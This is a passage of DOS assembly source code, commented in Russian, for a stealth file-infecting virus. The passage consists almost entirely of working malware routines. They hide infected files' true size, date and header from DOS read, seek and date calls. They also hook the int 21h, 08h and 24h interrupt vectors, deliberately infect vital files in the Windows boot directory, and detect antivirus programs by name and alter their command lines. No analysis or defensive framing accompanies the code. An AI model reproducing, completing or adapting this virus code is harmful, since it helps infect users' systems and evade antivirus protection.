        mov     [si],cx         ; сохранение параметров в FindDataRecord
        mov     [si+2],dx

 dos_date:
        add     si,2            ; si -> дата файла
        call    sizst           ; di -> длина файла
        sub     si,2

        cmp     ax,1            ; проверка формата времени
        jz      no_win

        mov     ax,71a7h        ; перевод времени из формата
        mov     bl,1            ; DOS в формат Win95
        mov     di,si           ; DI -> buffer для времени и даты
        mov     cx,[di]         ; чтение времени и даты в формате DOS
        mov     dx,[di+2]
        call    int21           ; сейчас ES:[DI] содержит время Win95

 no_win:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; DATE stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 date_get:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    int21           ; запрос даты
        call    hidestm         ; маскировка даты
        clc
        jmp     seek_ret

 date_set:
        call    OpenSFT         ; открыть SFT
        call    int21           ; установка даты
        call    correctdate     ; правка даты
        jmp     seek_ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; LSEEK stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekstealth:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    ioctl           ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        push    cx              ; сохранение CX
        cmp     al,2            ; проверка типа
        jne     forw
        sub     dx,vsize        ; маскировка настоящего конца файла
        sbb     cx,0            ; сдвиг идет от головы вируса
 forw:  call    int21           ; здесь установка указателя идет от начала
        pop     cx              ; восстановление CX
        jc      seek_ret        ; или от текущей позиции
        call    seekhide        ; блокировка попадания lseek на тело вируса
        mov     ax,cs:seek_pos
        mov     dx,cs:seek_pos+2
        jmp     seek_ret

 no_seek:
        call    int21           ; вызов DOS
 seek_ret:
        call    CloseSFT        ; закрыть SFT
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; READ stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 readstealth:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    ioctl           ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        call    SeekSave        ; сохранение позиции указателя
        call    int21           ; запрос чтения данных
        jc      seek_ret
        call    SaveRegs        ; сохранение регистров
        mov     di,dx           ; дублирование смещения буфера
        mov     cs:nrbytes,ax   ; количество прочитанных байт

        cmp     d cs:seek_pos,32 ; читают заголовок?
        jae     zone
        call    crload          ; прочитать настоящее начало файла

        lea     si,buffer       ; SI -> настоящее начало
        add     si,cs:seek_pos  ; SI -> с учетем смещения чтения

        mov     cx,cs:nrbytes   ; считаем количество байт которые нам нужно
        add     cx,cs:seek_pos  ; состелсить
        cmp     cx,32           ; позиция конца чтения лежит за пределом
        jbe     $+5             ; сохраненного начала файла?
        mov     cx,32
        sub     cx,cs:seek_pos

        jcxz    zone            ; в случае чтения 0 байт
 rhide: mov     al,cs:[si]      ; подмена инфицированного начала файла на
        mov     [di],al         ; оригинальное
        inc     si
        inc     di
        loop    rhide

 zone:  call    seekhide        ; блокируем возможность попадания lseek на
        call    LoadRegs        ; зону вируса + уменьшения числа прочитанных
        mov     ax,cs:nrbytes   ; байт
        jmp     seek_ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; ALL HANDLER stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 patchsft:
        call    OpenSFT         ; открыть SFT
        jmp     no_seek

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; WRITE stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 diswrite:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    ioctl           ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        call    SaveRegs        ; сохранение регистров
        call    SeekSave        ; сохранение позиции указателя
        mvs     ds,cs           ; DS=CS

        call    crload          ; загрузка оригинального начала в буфер
        call    seek2bof        ; поместить указатель в начало файла
        mov     cx,32           ; запись оригинального заголовка файла
        lea     dx,buffer
        call    write
        xor     cx,ax           ; ошибка? ну тогда при записи того,
        jnz     disfail         ; чего просят ошибка будет тоже!

        mov     cx,-1           ; двигаемся к голове вируса. т.е.
        mov     dx,-vsize       ; к концу зараженной программы
        call    seekfrom_eof
        mov     ah,40h          ; обрезаем файл
        xor     cx,cx           ; удаляем тело вируса из вирусоносителя
        call    int21
        mov     ah,68h          ; сбрасываем буфера
        call    int21
 disfail:
        call    RestoreSeek     ; восстанавление позиции указателя
        call    LoadRegs        ; восстанавление регистров
        jmp     no_seek         ; выходим

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка инфицированности памяти
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 tsrtest:
        mov     ax,3265h        ; Hi, AX=3265
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; повторный перехват вектора int 21h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 rehook:
        call    SaveRegs        ; сохранение регистров
        call    chk_dup         ; проверка, был ли вектор уже
        jnz     no_hook         ; переустановлен
        call    WinOldAp        ; проверка, что-нибудь изменилось с
        cmp     ax,cs:w95state  ; момента инсталляции вируса в память
        jz      no_hook         ; (была ли загружена Win95)

        mov     ax,3521h        ; получение вектора int 21h
        int     21h
        mov     ax,2521h        ; установка нового вектора прерывания
        lea     dx,manager
        mvs     ds,cs
        int     21h
        call    set_dup         ; сохранение вектора в другой ячейке IVT
 no_hook:
        call    LoadRegs        ; восстановление регистров
        jmp     exithandler

; ════════════════════════> S·U·B·R·O·U·T·I·N·E·S <═════════════════════════
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; загрузка и перехват векторов прерываний
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 VectMan:
        call    SaveRegs        ; сохранение регистров

        mvs     ds,cs           ; инициализация сегментного регистра
        call    WinOldAp        ; получение статуса инсталляции WinOldAp
        mov     w95state,ax     ; сохранение флажка

        mov     ax,3521h        ; AH=35 AL=INT# - функция для получения
        int     21h             ; вектора прерывания AL
        mov     io21p,bx        ; сохранить вектор в ячейке памяти
        mov     io21p+2,es
        call    set_dup         ; установить 21-й вектор прерывания на другой
        mov     ax,2521h        ; установить свой обработчик
        lea     dx,handler      ; прерывания
        int     21h
        mov     ax,3508h        ; запрос вектора прерывания
        int     21h
        mov     io08,bx         ; сохранение вектора в ячейках памяти
        mov     io08+2,es
        mov     ax,2508h        ; установка прерывания 08h (таймер)
        lea     dx,vguard       ; для проверки целостности кода
        int     21h

        call    LoadRegs        ; восстановление векторов
        ret

 get_dup:
        push    ds si           ; загрузка регистров ES:BX оригинальным
        mvs     ds,0            ; вектором 21-го прерывания
        mov     si,63h*4
        mov     bx,[si]
        mov     es,[si+2]
        pop     si ds
        ret

 set_dup:
        push    ds si           ; сохранение ES:BX в 63-й векторе
        mvs     ds,0            ; прерывания
        mov     si,63h*4
        mov     [si],bx
        mov     [si+2],es
        pop     si ds
        ret

 chk_dup:
        push    ds si eax       ; проверка изменение 63-го вектора
        mvs     ds,0            ; прерывания
        mov     si,63h*4
        mov     eax,[si]
        cmp     d cs:io21p,eax
        pop     eax si ds
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка активности Win95 (используя WinOldAp)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 WinOldAp:
        mov     ax,1700h        ; функция WinOldAp Installation Check
        int     2fh             ; программа, которая присутствует в Win95
        ret                     ; в 32-разрядном режиме в PE формате

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; заражение некоторых жизненно важных файлов
; использует STACKS в качестве буфера для имен файлов
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 FixVirus:
        call    SaveRegs        ; сохранение регистров
        mov     si,2ch          ; по смещению 2C в PSP хранится сегмент
        mov     ds,cs:[si]      ; окружения
        xor     si,si           ; подготовка к сканированию окружения
        mvs     es,cs           ; ES:DI -> параметр окружения winbootdir
        lea     di,windows

 FxD:   call    compare         ; сравнение элеменита шаблона winbootdir
        jz      FxedI           ; с ячейкой окружения по DS:SI
        cmp     w [si],0        ; проверка на окончания блока глобальных
        jz      FxOUT           ; параметров
        inc     si              ; иначе увеличение индекса окружения
        jmp     FxD             ; искать дальше

 FxedI: lodsb                   ; здесь не только цикл, но еще сверху есть JZ
        xor     al,'='          ; поиск окончания имени переменной
        jnz     FxedI           ; '='

        mov     ah,60h          ; "TRUENAME" - CANONICALIZE FILENAME OR PATH
        lea     di,stacks       ; DS:SI - директория MD, ES:DI - наш буфер
        int     21h
        lea     di,stacks       ; DI - результат
        mvs     ds,cs           ; установка DS на сегмент вируса
        xor     al,al           ; поиск нуля в результата
        mov     cx,256          ; поиск в районе 256-ти байт
        cld
        repne   scasb
        jnz     FxOUT           ; выход в случае ошибки

        dec     di              ; DI указывает на ноль в директории
        cmp     b [di-1],'\'    ; проверка двойного \\
        jnz     $+3
        dec     di
        mov     bx,di           ; дублирование указателя
        lea     si,files        ; SI указывает на список файлов для инфекта

 FxVI:  cmp     b [si],0        ; больше нет жертв?
        jz      FxOUT           ; в этом случае выход
        mov     di,bx           ; копирование имени очерередной
        lodsb                   ; жертвы
        stosb
        or      al,al
        jnz     $-4

        mov     ax,1857h        ; вызов внутренней функции вируса
        lea     dx,stacks       ; для инфицирования файла по DS:DX
        int     21h
        jmp     FxVI            ; взять следующий файл

 FxOUT: call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Open/Close SFT - подпрограмма для закрытия/открытия нормальной SFT
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 OpenSFT:
        call    SaveRegs        ; сохранение регистров
        mov     si,0            ; "Open"
        jmp     Manipulate

 CloseSFT:
        call    SaveRegs        ; сохранение регистров
        mov     si,1            ; "Close"

 Manipulate:
        mov     bp,bx           ; сохранение handle
        call    ioctl           ; проверка, это файл или chardevice
        jc      SFT_Error

        mov     ax,1220h        ; получение JFT для этого файла
        int     2fh
        jc      SFT_Error
        xor     bx,bx
        mov     bl,es:[di]      ; BL = System file entry
        cmp     bl,0ffh
        je      SFT_Error
        mov     ax,1216h        ; получение адреса SFT в ES:DI
        int     2fh
        jc      SFT_Error

        mov     bx,bp           ; восстановление handle
        call    Inf_Check       ; проверка инфицированности файла
        jnc     SFT_Error       ; выход в случае чистого файла

        mov     eax,vsize
        cmp     si,0            ; "Open"?
        jz      open
        neg     eax
 open:  add     es:[di+11h],eax ; сохранение в SFT размера

        mov     dx,es:[di+0fh]  ; получение даты файла
        call    hidestm         ; скрытие лишних 100 лет
        cmp     si,0            ; "Open"?
        jnz     clsft
        ror     dh,1            ; увеличение даты файла
        add     dh,100
        rol     dh,1
 clsft: mov     es:[di+0fh],dx  ; сохранение измененной даты

 SFT_Error:
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; size stealth
; ES:SI -> Дата файла
; ES:DI -> Длина файла
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sizst: mov     dx,es:[si]      ; dx = дата файла
        call    hidestm         ; маскировка и проверка 100 лишних лет
        jnc     oklen           ; файл инфицирован?
        mov     W es:[si],dx    ; установить нормальную дату файла
        sub     W es:[di],vsize ; маскировка приращения длины файла
        sbb     W es:[di+2],0
 oklen: ret

 hidestm:
        push    dx              ; сохранить дату в стеке
        shr     dh,1            ; получить год файла
        cmp     dh,100          ; сравнение его с 100
        pop     dx              ; восстановить дату
        jb      okinf
        ror     dh,1            ; получить год файла
        sub     dh,100          ; спрятать лишнее
        rol     dh,1            ;
        stc                     ; файл заражен!
        ret
 okinf: clc
        ret

 correctdate:
        mov     ax,5700h        ; установка даты файла в зависимости
        call    int21           ; от того, заражен ли он
        call    HideStm         ; нормальная дата
        call    Inf_Check       ; проверить файл на зараженность
        jnc     okdat
        ror     dh,1
        add     dh,100
        rol     dh,1
 okdat: mov     ax,5701h        ; установка откорректированной
        call    int21           ; даты файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Проверка имени файла (AVs)
; Проверка расширения файла (Extens)
; При SAVE_AX=4B00 добавление параметров в cmdline
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Filename:
        call    SaveRegs        ; сохранение регистров
        cld

        mov     si,dx           ; смещение имени в индексный регистр
 nfind: lodsb                   ; поиск имени файла
        cmp     al,':'          ; в нашем случае оно будет следовать
        jz      separ           ; за последним "/", "\", ":"
        cmp     al,'\'
        jz      separ
        cmp     al,'/'
        jnz     store
 separ: mov     dx,si           ; сохранить смещение

 store: or      al,al           ; проверка конца строки (0)
        jnz     nfind

        mov     si,dx           ; SI -> имя файла
        xor     di,di           ; расширение пока не найдено
 gext:  lodsb
        cmp     al,'.'          ; расширение?
        jnz     $+4
        mov     di,si
        or      al,al
        jnz     gext
        or      di,di           ; если точек в имнеи файла
        jz      Bad_File        ; обнаружено не было

        lea     bp,[di-1]       ; сейчас BP-расширение файла, DX-его имя
        mvs     es,cs           ; ES=CS

        cmp     cs:save_ax,4b00h
        jne     no_add
        mov     si,dx           ; SI -> имя файла
        lea     di,prms         ; табличка (формат: avname,0,0,cmdline,0dh)

 scancmd:
        call    compare         ; сравнение имени запускаемой программы
        jz      addprm          ; с предусмотренным именем из таблицы
        mov     al,0dh
        mov     cx,0ffffh
        repne   scasb
        cmp     b cs:[di],0     ; конец таблицы?
        jnz     scancmd         ; в таблице имя не найдено - запущена
        jmp     no_add          ; другая программа

 addprm:
        push    es              ; сохранение ES
        mov     al,0
        mov     cx,0ffffh
        repne   scasb
        lea     si,[di+1]
        les     bx,d cs:save_bx ; загрузка в ES:BX адреса EPB
        les     bx,es:[bx+2]    ; загрузка адреса командной строки в ES:BX
        mov     di,bx
 getdx: inc     di              ; сканируем командную строку
        cmp     b es:[di],0dh   ; конец строки?
        jnz     getdx
        mov     cx,-1           ; счетчик длины дополнительного параметра
        lods    b cs:[si]       ; загрузка байта параметра
        stosb                   ; сохранение байта параметра
        inc     cx              ; увеличение счетчика
        cmp     al,0dh          ; проверка на окончание параметра
        jnz     $-6
        add     es:[bx],cl      ; увеличение длины командной строки
        pop     es              ; восстановление ES

 no_add:
        mov     si,bp
        lea     di,extens       ; ES:DI указывают на таблицу с
        call    compare         ; разрешенными расширениями
        jnz     Bad_File        ; некорректное расширение?

        mov     al,[si+1]       ; загрузка первого байта расширения
        call    upreg           ; перевод в верхний регистр
        mov     cs:host,al      ; установка флага

        mov     si,dx           ; SI -> имя файла
        lea     di,AVs          ; ES:DI -> таблица с именами
        call    compare         ; сравнение имен
        jz      Bad_File        ; неХоРошее имя

        call    LoadRegs        ; восстановление регистров
        clc                     ; очистка CF
        ret

 Bad_File:
        call    LoadRegs        ; восстановление регистров
        stc                     ; установка CF
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; установка байта STF в зависимости от текущего PSP/MCB
; байт равен 1 если текущий MCB принадлежит программе из STLOCK
; байт равен 0 если владелец текущего MB не зарегистрирован в STLOCK
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 mcbcheck:
        call    SaveRegs        ; сохранение регистров

        mov     ah,62h          ; запрос сегмента текущего PSP
        call    int21
        dec     bx              ; получение сегмента MCB
        mov     ds,bx           ; DS:SI указывают на владельца MB
        mov     si,08h          ;
        lea     di,stlock       ; ES:DI указывают на наш
        mvs     es,cs           ; список имен STLOCK
        call    compare         ; сравнение данных
        sete    cs:stf          ; установка стелс-флага

        call    LoadRegs        ; восстановление регистров
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; COMPARE - сравнение данных
; DS:SI - источник
; ES:DI - таблица (Data1,0,Data2,0,...,DataN,0,0)
; Выход: ZF = 1 в случае совпадения данных
; Регистр латинских букв значения не имеет
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 compare:
        call    SaveRegs        ; сохранение регистров
        mov     dx,si           ; дублирование смещения источника

 data1: mov     si,dx           ; восстановление смещения источника
 data2: mov     al,ds:[si]      ; чтения байта источника
        mov     ah,es:[di]      ; чтения байта таблицы
        inc     di              ; увеличение индексных регистров
        inc     si              ;
        call    upreg           ; перевод символов в верхний регистр
        or      ah,ah           ; если в таблице образовался 0 =>
        jz      equal           ; => данные совпали
        cmp     al,ah           ; иначе побайтное сравнение
        jz      data2           ; если байты совпали, проверяем дальше

 data3: cmp     B es:[di],0     ; быйты не совпали, берем следующее
        jz      data4           ; поле
        inc     di
        jmp     data3

 data4: inc     di
        cmp     B es:[di],0     ; проверка на последнюю запись в
        jnz     data1           ; таблице

        call    LoadRegs        ; таблица кончилась: совпадений не найдено
        cmp     di,-1           ; очистка ZF
        ret                     ; выход из подпрограммы

 equal: call    LoadRegs        ; восстановление регистров
        cmp     al,al           ; установка ZF
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Gets a random value [0..AX]
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 xrandom:
        push    bx cx dx si di
        mov     si,ax
        mov     ax,cs:random1
        mov     bx,cs:random2
        mov     cx,ax
        mov     di,8405h
        mul     di
        shl     cx,3
        add     ch,cl
        add     dx,cx
        add     dx,bx
        shl     bx,2
        add     dx,bx
        add     dh,bl
        shl     bx,5
        add     dh,bl
        add     ax,1
        adc     dx,0
        mov     cs:random1,ax
        mov     cs:random2,dx
        or      si,si
        jz      rnd_exit

        xor     dx,dx
        div     si
        xchg    ax,dx
 rnd_exit:
        pop     di si dx cx bx
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограммы для установки/снятия вектора прерывания
; критических ошибок int 24h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Hook24:
        call    SaveRegs        ; сохранение и перехват
        xor     ax,ax           ; вектора прерывания критических
        mov     ds,ax           ; ошибок int 24h
        mov     si,24h*4
        mov     dx,cs
        lea     ax,int24
        xchg    ax,[si]
        xchg    dx,[si+2]
        mov     cs:io24,ax
        mov     cs:io24+2,dx
        call    LoadRegs
        ret

 Remove24:
        call    SaveRegs        ; восстановление вектора int 24h
        xor     ax,ax
        mov     ds,ax
        mov     si,24h*4
        mov     ax,cs:io24
        mov     dx,cs:io24+2
        mov     [si],ax
        mov     [si+2],dx
        call    LoadRegs
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограммы для работы с файлами
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 RestoreFileAttributesA:
        push    ax bx cx dx ds
        mov     ax,7143h
        mov     cx,4301h
        mov     bx,1
        call    LFNAPI_Check
        mov     dx,cs:fn_ptr
        mov     ds,cs:fn_ptr+2
        mov     cx,cs:Attrib
        test    cl,1
        jz      noRFA
        call    int21
 noRFA: pop     ds dx cx bx ax
        ret

 ClearFileAttributesA:
        push    ax bx cx dx
        mov     ax,7143h
        xor     bx,bx
        mov     cx,4300h
        call    LFNAPI_Check
        call    int21
        jc      NoFA
        mov     cs:Attrib,cx
        mov     cs:fn_ptr,dx
        mov     cs:fn_ptr+2,ds
        test    cl,1
        jz      NoFA
        mov     ax,7143h
        mov     bx,1
        mov     cx,4301h
        call    LFNAPI_Check
        mov     cx,20h
        call    int21
        jc      NoFA
 NoFA:  pop     dx cx bx ax
        ret

 CreateFileA:
        push    ax cx dx si
        mov     ax,716ch
        mov     cx,6c00h
        call    LFNAPI_Check
        mov     bx,2
        xor     cx,cx
        mov     si,dx
        mov     dx,1
        call    int21
        xchg    ax,bx
        pop     si dx cx ax
        ret

 LFNAPI_Check:
        push    ax cx bx
        mov     ax,71a1h
        mov     bx,-1
        call    int21
        or      al,al
        jz      noLFNAPI
        pop     bx cx ax
        ret
 noLFNAPI:
        pop     bx ax cx
        ret

 GetDate:                       ; получение времени и даты
        mov     ax,5700h        ; последней записи в файл
        call    int21
        mov     cs:time,cx
        mov     cs:date,dx
        ret

 RestDate:                      ; восстановление времени и даты
        mov     ax,5701h        ; файла
        mov     cx,cs:time
        mov     dx,cs:date
        call    int21
        ret

 Write: mov     ah,40h          ; запись в файл
        call    int21
        ret

 Read:  mov     ah,3fh          ; чтение из файла
        call    int21
        ret

 CloseFile:
